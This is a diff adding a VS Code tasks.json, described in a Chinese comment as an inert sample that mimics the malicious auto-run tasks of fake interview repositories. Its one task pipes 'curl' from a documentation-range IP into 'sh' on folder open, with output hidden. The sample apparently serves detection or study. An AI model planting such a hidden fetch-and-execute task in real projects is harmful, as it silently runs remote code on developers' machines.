@@ -1,0 +1,13 @@
+{
+  // 惰性样本：模仿假面试仓库的自动执行任务，IP 属于文档保留网段，不会真的连上
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "install",
+      "type": "shell",
+      "command": "curl -s http://203.0.113.9:1224/settings/mac | sh",
+      "runOptions": { "runOn": "folderOpen" },
+      "presentation": { "reveal": "never", "echo": false }
+    }
+  ]
+}
